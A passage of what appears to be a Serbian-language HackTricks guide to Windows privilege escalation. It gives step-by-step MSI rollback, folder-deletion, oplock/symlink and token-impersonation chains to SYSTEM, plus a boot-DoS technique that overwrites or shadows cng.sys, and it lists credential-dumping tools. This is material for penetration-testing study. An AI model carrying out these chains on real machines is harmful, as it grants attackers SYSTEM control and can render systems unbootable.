Ovaj primitiv za brisanje uklapa se u rollback lanac ispod: sačuvajte zaseban zapis `Installer\Folders`, obrišite zaštićeni `C:\Config.Msi`, ponovo ga napravite sa NULL DACL-om i zadržite handle sa dozvolom `WRITE_DAC` otvorenim pre nego što installer pooštri DACL. Unapred otvorenim handle-om može da se vrati permisivni DACL pomoću `NtSetSecurityObject`, nakon čega generisani `.rbs` može da se zameni pre nego što se rollback nastavi.<sup>[[41]](#references)</sup>

Microsoft je ispravio putanju tako što je sprečio `CMsiTransaction::SetEEUIDirectoryAndFilter` da pozove `ScheduleFileOrFolderDelete` kada je omogućena nova feature gate opcija. COM poziv i dalje može da vrati uspeh, ali više ne dodaje putanju koju kontroliše napadač u `TempPackages`. Instalirajte bezbednosna ažuriranja za Windows iz aprila 2025. umesto da uspešan povratak metode koristite kao proveru da li je ispravka primenjena.<sup>[[41]](#references)[[42]](#references)</sup>

Sažeta tehnika je sledeća:

1. **Faza 1 – Priprema za preotimanje (ostavite `C:\Config.Msi` praznim)**

- Korak 1: Instalirajte MSI
    - Napravite `.msi` koji instalira bezopasnu datoteku (npr. `dummy.txt`) u folder u koji može da se upisuje (`TARGETDIR`).
    - Označite installer kao **"UAC Compliant"**, tako da može da ga pokrene **korisnik koji nije administrator**.
    - Posle instalacije ostavite otvoren **handle** ka datoteci.

- Korak 2: Započnite deinstalaciju
    - Deinstalirajte isti `.msi`.
    - Proces deinstalacije počinje da premešta datoteke u `C:\Config.Msi` i da ih preimenuje u `.rbf` datoteke (rollback rezervne kopije).
    - **Anketirajte otvoreni handle** pomoću `GetFinalPathNameByHandle` da biste utvrdili kada datoteka postane `C:\Config.Msi\<random>.rbf`.

- Korak 3: Prilagođena sinhronizacija
    - `.msi` sadrži **prilagođenu akciju deinstalacije (`SyncOnRbfWritten`)** koja:
        - Signalizira kada je `.rbf` upisan.
        - Zatim **čeka** na drugi događaj pre nego što nastavi deinstalaciju.

- Korak 4: Sprečite brisanje `.rbf` datoteke
    - Kada dobijete signal, **otvorite `.rbf` datoteku** bez `FILE_SHARE_DELETE` — time **sprečavate njeno brisanje**.
    - Zatim **pošaljite signal nazad** da bi se deinstalacija završila.
    - Windows Installer ne uspeva da obriše `.rbf`, a pošto ne može da obriše sav sadržaj, **`C:\Config.Msi` se ne uklanja**.

- Korak 5: Ručno obrišite `.rbf`
    - Vi (napadač) ručno brišete datoteku `.rbf`.
    - Sada je **`C:\Config.Msi` prazan** i spreman za preotimanje.

> U ovom trenutku pokrenite **ranjivost za proizvoljno brisanje foldera na nivou SYSTEM** da biste obrisali `C:\Config.Msi`.

2. **Faza 2 – Zamena rollback skripti zlonamernim skriptama**

- Korak 6: Ponovo napravite `C:\Config.Msi` sa slabim ACL-ovima
    - Sami ponovo napravite folder `C:\Config.Msi`.
    - Postavite **slabe DACL-ove** (npr. Everyone:F) i **ostavite otvoren handle** sa dozvolom `WRITE_DAC`.

- Korak 7: Pokrenite još jednu instalaciju
    - Ponovo instalirajte `.msi` sa sledećim:
        - `TARGETDIR`: Lokacija u koju može da se upisuje.
        - `ERROROUT`: Promenljiva koja izaziva prinudni neuspeh.
    - Ova instalacija će se koristiti za ponovno pokretanje **rollback-a**, koji čita `.rbs` i `.rbf`.

- Korak 8: Pratite pojavljivanje `.rbs`
    - Koristite `ReadDirectoryChangesW` da biste pratili `C:\Config.Msi` dok se ne pojavi novi `.rbs`.
    - Sačuvajte njegovo ime datoteke.

- Korak 9: Sinhronizujte pre rollback-a
    - `.msi` sadrži **prilagođenu akciju instalacije (`SyncBeforeRollback`)** koja:
        - Signalizira događaj kada se napravi `.rbs`.
        - Zatim **čeka** pre nego što nastavi.

- Korak 10: Ponovo primenite slabe ACL-ove
    - Nakon prijema događaja `.rbs created`:
        - Windows Installer **ponovo primenjuje jake ACL-ove** na `C:\Config.Msi`.
        - Ali pošto i dalje imate handle sa dozvolom `WRITE_DAC`, možete **ponovo da primenite slabe ACL-ove**.

> ACL-ovi se **proveravaju samo prilikom otvaranja handle-a**, tako da i dalje možete da upisujete u folder.

- Korak 11: Postavite lažne `.rbs` i `.rbf`
    - Zamenite datoteku `.rbs` **lažnom rollback skriptom** koja nalaže Windows-у да:
        - Vrati vašu `.rbf` datoteku (zlonamerni DLL) na **privilegovanu lokaciju** (npr. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Postavite lažni `.rbf` koji sadrži **zlonamerni DLL payload na nivou SYSTEM**.

- Korak 12: Pokrenite rollback
    - Pošaljite signal za sinhronizaciju da bi se installer nastavio.
    - **Prilagođena akcija tipa 19 (`ErrorOut`)** podešena je da **namerno obori instalaciju** u poznatoj tački.
    - Time se pokreće **rollback**.

- Korak 13: SYSTEM instalira vaš DLL
    - Windows Installer:
        - Čita vaš zlonamerni `.rbs`.
        - Kopira vaš `.rbf` DLL na ciljnu lokaciju.
    - Sada imate **zlonamerni DLL na putanji koju učitava SYSTEM**.

- Završni korak: Izvršite SYSTEM kod
    - Pokrenite pouzdan **auto-elevated binary** (npr. `osk.exe`) koji učitava DLL koji ste preoteli.
    - **Bum**: Vaš kod se izvršava **kao SYSTEM**.


### Od proizvoljnog brisanja/pomeranja/preimenovanja datoteka do SYSTEM EoP

Glavna MSI rollback tehnika (prethodna) pretpostavlja da možete da obrišete **ceo folder** (npr. `C:\Config.Msi`). Ali šta ako vaša ranjivost omogućava samo **proizvoljno brisanje datoteka**?

Mogli biste da iskoristite **NTFS interne mehanizme**: svaki folder ima skriveni alternativni tok podataka pod nazivom:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Ovaj stream čuva **metapodatke indeksa** fascikle.

Dakle, ako **obrišete stream `::$INDEX_ALLOCATION`** fascikle, NTFS **uklanja celu fasciklu** iz sistema datoteka.

To možete uraditi pomoću standardnih API-ja za brisanje datoteka, kao što su:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Iako pozivate API za brisanje *datoteke*, on **briše samu fasciklu**.

### Od brisanja sadržaja fascikle do SYSTEM EoP
Šta ako vam primitivna operacija ne dozvoljava da brišete proizvoljne datoteke/fascikle, ali vam **dozvoljava da brišete *sadržaj* fascikle pod kontrolom napadača**?

1. Korak 1: Napravite mamac-fasciklu i datoteku
- Napravite: `C:\temp\folder1`
- U njoj napravite: `C:\temp\folder1\file1.txt`

2. Korak 2: Postavite **oplock** na `file1.txt`
- **Oplock pauzira izvršavanje** kada privilegovani proces pokuša da obriše `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Korak 3: Pokrenite SYSTEM proces (npr., `SilentCleanup`)
- Ovaj proces skenira fascikle (npr., `%TEMP%`) i pokušava da izbriše njihov sadržaj.
- Kada naiđe na `file1.txt`, **oplock se aktivira** i prepušta kontrolu vašem callback-u.

4. Korak 4: Unutar oplock callback-a – preusmerite brisanje

- Opcija A: Premestite `file1.txt` na drugo mesto
    - Time se prazni `folder1` bez prekidanja oplock-a.
    - Nemojte direktno brisati `file1.txt` — to bi prerano oslobodilo oplock.

- Opcija B: Pretvorite `folder1` u **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Opcija C: Kreirajte **symlink** u `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Ovo cilja interni NTFS stream koji čuva metapodatke fascikle — njegovim brisanjem briše se fascikla.

5. Korak 5: Oslobodite oplock
- SYSTEM proces nastavlja rad i pokušava da obriše `file1.txt`.
- Ali sada, zbog junction-a + symlink-a, zapravo briše:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Rezultat**: `C:\Config.Msi` briše SYSTEM.

### Od kreiranja proizvoljne fascikle do trajnog DoS-a

Iskoristite primitivu koja omogućava da **kreirate proizvoljnu fasciklu kao SYSTEM/admin** — čak i ako **ne možete da upisujete datoteke** ili **postavite slabe dozvole**.

Kreirajte **fasciklu** (ne datoteku) čiji je naziv **kritični Windows drajver**, npr.:
```
C:\Windows\System32\cng.sys
```

- Ova putanja obično odgovara kernel-mode drajveru `cng.sys`.
- Ako je **unapred kreirate kao fasciklu**, Windows neće uspeti da učita stvarni drajver pri pokretanju.
- Zatim Windows pokušava da učita `cng.sys` tokom pokretanja.
- Nailazi na fasciklu, **ne uspeva da razreši stvarni drajver** i **ruši sistem ili zaustavlja pokretanje**.
- **Nema rezervne opcije** ni **oporavka** bez spoljne intervencije (npr. popravke pokretanja ili pristupa disku).

### Od privilegovanih putanja za logove/rezervne kopije + OM symlinks do proizvoljnog prepisivanja fajlova / boot DoS

Kada **privilegovani servis** upisuje logove/izvoze na putanju pročitanu iz **konfiguracije koju je moguće menjati**, preusmerite tu putanju pomoću **Object Manager symlinks + NTFS mount points** da biste privilegovani upis pretvorili u proizvoljno prepisivanje fajla (čak i **bez** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Zahtevi**
- Konfiguracionu datoteku u kojoj je sačuvana ciljna putanja napadač može da menja (npr. `%ProgramData%\...\.ini`).
- Mogućnost kreiranja mount point-a ka `\RPC Control` i OM file symlink-a (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Privilegovana operacija koja upisuje na tu putanju (log, izvoz, izveštaj).

**Primer lanca**
1. Pročitajte konfiguracionu datoteku da biste saznali privilegovano odredište loga, npr. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` u `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Preusmerite putanju bez administratorskih privilegija:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Sačekajte da privilegovana komponenta upiše zapisnik (npr. administrator pokrene „slanje testnog SMS-a“). Zapis se sada upisuje u `C:\Windows\System32\cng.sys`.
4. Pregledajte prepisanu metu (hex/PE parserom) da biste potvrdili oštećenje; ponovno pokretanje primorava Windows da učita izmenjenu putanju upravljačkog programa → **DoS cikličnim pokretanjem**. Ovo se može primeniti i na bilo koju zaštićenu datoteku koju će privilegovana usluga otvoriti za pisanje.

> `cng.sys` se obično učitava iz `C:\Windows\System32\drivers\cng.sys`, ali ako kopija postoji u `C:\Windows\System32\cng.sys`, Windows može prvo da pokuša da je učita, što je čini pouzdanom metom za DoS pomoću oštećenih podataka.



## **Od High Integrity do System**

### **Nova usluga**

Ako već radite u procesu sa High Integrity nivoom, **putanja do SYSTEM-a** može biti jednostavna: samo **napravite i pokrenite novu uslugu**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Prilikom kreiranja service binary-ja proverite da li je u pitanju validan service ili da li binary brzo izvršava neophodne radnje, jer će biti prekinut za 20 sekundi ako nije validan service.

### AlwaysInstallElevated

Iz procesa sa High Integrity možete pokušati da **omogućite AlwaysInstallElevated registry entries** i **instalirate** reverse shell pomoću _**.msi**_ wrapper-a.\
[Više informacija o uključenim registry keys i tome kako da instalirate _.msi_ paket možete pronaći ovde.](#alwaysinstallelevated)

### High + SeImpersonate privilegija do System

**Kod možete** [**pronaći ovde**](seimpersonate-from-high-to-system.md)**.**

### Od SeDebug + SeImpersonate do privilegija Full Token

Ako imate te token privilegije (verovatno ćete ih pronaći u već pokrenutom procesu sa High Integrity), moći ćete da **otvorite skoro svaki proces** (osim zaštićenih procesa) pomoću SeDebug privilegije, **kopirate token** procesa i kreirate **proizvoljan proces sa tim tokenom**.\
Ova tehnika obično podrazumeva **izbor bilo kog procesa koji se pokreće kao SYSTEM sa svim token privilegijama** (_da, možete pronaći SYSTEM procese koji nemaju sve token privilegije_).\
**Primer koda koji izvršava predloženu tehniku možete** [**pronaći ovde**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Ovu tehniku koristi meterpreter za eskalaciju privilegija u `getsystem`. Tehnika se sastoji od **kreiranja pipe-a, a zatim kreiranja/zloupotrebe service-a radi upisivanja u taj pipe**. Zatim će **server** koji je kreirao pipe koristeći privilegiju **`SeImpersonate`** moći da **impersonate token** pipe klijenta (service-a) i dobije SYSTEM privilegije.\
Ako želite da [**saznate više o name pipes, pročitajte ovo**](#named-pipe-client-impersonation).\
Ako želite da pročitate primer [**prelaska sa high integrity na System pomoću name pipes, pročitajte ovo**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ako uspete da **hijack-ujete dll** koji **učitava** **proces** pokrenut kao **SYSTEM**, moći ćete da izvršite proizvoljan kod sa tim dozvolama. Zato je Dll Hijacking koristan i za ovu vrstu eskalacije privilegija. Štaviše, mnogo ga je **lakše postići iz procesa sa high integrity**, jer on ima **dozvole za upisivanje** u fascikle koje se koriste za učitavanje dll-ova.\
**Možete** [**saznati više o Dll hijacking-u ovde**](dll-hijacking/index.html)**.**

### **Od Administrator ili Network Service do System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Od LOCAL SERVICE ili NETWORK SERVICE do svih privilegija

**Pročitajte:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Dodatna pomoć

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Korisni alati

**Najbolji alat za traženje vektora lokalne eskalacije privilegija u Windows-u:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Proverava pogrešne konfiguracije i osetljive datoteke (**[**proverite ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detektovan.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Proverava neke moguće pogrešne konfiguracije i prikuplja informacije (**[**proverite ovde**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Proverava pogrešne konfiguracije**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Izvlači informacije o sačuvanim sesijama za PuTTY, WinSCP, SuperPuTTY, FileZilla i RDP. Koristite -Thorough lokalno.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Izvlači kredencijale iz Credential Manager-a. Detektovan.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Isprobava prikupljene lozinke u domenu**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh je PowerShell ADIDNS/LLMNR/mDNS spoofing i man-in-the-middle alat.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Osnovno Windows privesc enumerisanje**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Traži poznate privesc ranjivosti (ZASTAREO, zamenjen alatom Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalne provere **(potrebna su Admin prava)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Traži poznate privesc ranjivosti (mora se kompajlirati pomoću VisualStudio) ([**prekompajlirani**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumeriše host u potrazi za pogrešnim konfiguracijama (više služi za prikupljanje informacija nego za privesc) (mora se kompajlirati) **(**[**prekompajlirani**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Izvlači kredencijale iz velikog broja softvera (prekompajlirani exe na github-u)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port alata PowerUp u C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Proverava pogrešne konfiguracije (prekompajlirani executable na github-u). Ne preporučuje se. Ne radi dobro u Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Proverava moguće pogrešne konfiguracije (exe iz python-a). Ne preporučuje se. Ne radi dobro u Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Alat napravljen na osnovu ove objave (za ispravan rad mu nije potreban accesschk, ali može da ga koristi).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Čita izlaz komande **systeminfo** i predlaže funkcionalne exploit-e (lokalni python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Čita izlaz komande **systeminfo** i predlaže funkcionalne exploit-e (lokalni Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projekat morate kompajlirati koristeći odgovarajuću verziju .NET-a ([pogledajte ovo](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Da biste videli instaliranu verziju .NET-a na hostu žrtve, možete da uradite sledeće:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Osnove eskalacije privilegija u Windows-u](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Eskalacija privilegija iskorišćavanjem slabih dozvola fascikli](http://www.greyhathacker.net/?p=738)
- [3] [Eskalacija privilegija u Windows-u – podsetnik](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Radionica o lokalnoj eskalaciji privilegija u Windows-u / Linux-u](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Napadi na Windows: AT je nova crna (Rob Fuller i Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Eskalacija privilegija - Windows - Kompletan OSCP vodič](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Eskalacija privilegija - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Vodič za eskalaciju privilegija u Windows-u](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Kontrolna lista za eskalaciju privilegija u Windows-u](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Eskalacija privilegija u Windows-u](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Metode eskalacije privilegija u Windows-u za pentestere](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: phishing putem Word VBA makroa preko SMTP-a → dešifrovanje hMailServer akreditiva → Veeam CVE-2023-27532 do SYSTEM-a](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: format-string leak + stack BOF → VirtualAlloc ROP (RCE) i krađa kernel tokena](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Potera za Silver Fox-om: mačka i miš u senkama kernela](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Ranjivost privilegovanog pristupa datotečnom sistemu u SCADA sistemu](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Alati za testiranje simboličkih veza – upotreba CreateSymlink-a](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Veza s prošlošću: zloupotreba simboličkih veza u Windows-u](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: opasno razrešavanje modula u Windows-u](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js moduli: učitavanje iz fascikli `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - Izazovi kontrolne liste za C/C++, rešeni](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - Funkcija RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Otmica binarnih datoteka servisa](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own sa Microslop-om: ulančavanje CLDFLT-a i DirectX uslova trke u kernelu za LPE u Windows-u](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Jedan I/O Ring da svima vlada: potpuna primitiva za čitanje/pisanje u Windows-u 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Zloupotreba proizvoljnog brisanja datoteka za eskalaciju privilegija i drugi sjajni trikovi](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - Eksploatacioni kod za FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – Napadi na WSUS, 2. deo: CVE-2020-1013, jednodnevna ranjivost za lokalnu eskalaciju privilegija u Windows-u 10](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Istraživanje Credential Manager-a i Windows Vault-a](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos delegiranje ograničeno na resurse: kada promena slike dovede do eskalacije privilegija](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Izdvajanje privatnih SSH ključeva iz Windows 10 SSH agenta](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Pretvaranje serverskih ažuriranja za preduzeća u fabrike backdoor-a (0_o) – 1. deo](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Pretvaranje serverskih ažuriranja za preduzeća u fabrike backdoor-a (0_o) – 2. deo](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Eskalacija privilegija brisanjem fascikle Windows Installer-a](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
{{#include ../../banners/hacktricks-training.md}}
